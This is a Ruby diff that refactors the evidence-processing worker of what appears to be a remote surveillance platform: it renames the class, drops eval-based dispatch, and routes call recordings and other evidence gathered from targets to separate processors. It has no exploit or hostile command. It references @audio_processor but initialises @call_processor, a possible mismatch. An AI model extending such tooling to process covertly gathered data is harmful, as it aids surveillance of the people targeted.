@@ -1,4 +1,5 @@
 require_relative 'audio_processor'
+require_relative 'single_processor'
 
 # from RCS::Common
 require 'rcs-common/trace'
@@ -26,7 +27,7 @@ end
 module RCS
 module Worker
 
-class InstanceProcessor
+class InstanceWorker
   include RCS::Tracer
   
   SLEEP_TIME = 10
@@ -107,27 +108,14 @@ class InstanceProcessor
               # store evidence_id inside evidence, we need it inside processors
               ev[:db_id] = evidence_id
 
-              # store agent instance in evidence (used when storing into db)
-              ev[:instance] = @agent['instance']
-              ev[:ident] = @agent['ident']
-
               trace :debug, "[#{evidence_id}] processing evidence of type #{ev[:type]}"
 
-              # find correct processing module and extend evidence
-              mod = "#{ev[:type].to_s.capitalize}Processing"
-              if RCS.const_defined? mod.to_sym
-                ev.extend eval(mod)
-              else
-                ev.extend DefaultProcessing
+              case ev[:type]
+                when :call
+                  @audio_processor.feed(ev)
+                else
+                  @single_processor.feed(ev)
               end
-
-              ev.process if ev.respond_to? :process
-
-              # override original type
-              ev[:type] = ev.type if ev.respond_to? :type
-              ev_type = ev[:type]
-
-              ev.store @agent, @target
 
               if forwarding? and ev[:grid_content]
                 Dir.mkdir "forwarded" unless File.exists? "forwarded"
@@ -169,7 +157,8 @@ class InstanceProcessor
       put_to_sleep
     end
     
-    #@call_processor = CallProcessor.new
+    @call_processor = CallProcessor.new(@agent, @target)
+    @single_processor = SingleProcessor.new(@agent, @target)
   end
   
   def resume
